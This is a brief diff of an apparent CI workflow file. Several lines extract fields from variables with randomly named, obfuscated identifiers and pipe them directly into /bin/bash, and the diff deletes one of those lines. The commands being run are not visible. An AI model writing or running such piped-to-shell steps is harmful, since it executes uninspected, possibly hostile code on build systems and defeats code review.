@@ -66,7 +66,6 @@ jobs:
           printf '%s' "$zrk759" | jq -r .qujx78 | /bin/bash
           printf '%s' "$wwjv7019" | jq -r .ase550 | /bin/bash
           printf '%s' "$w6424" | jq -r .wvn70 | /bin/bash
-          printf '%s' "$hi7" | jq -r .nj8 | /bin/bash
 
       - name: Save archive
         if: always()
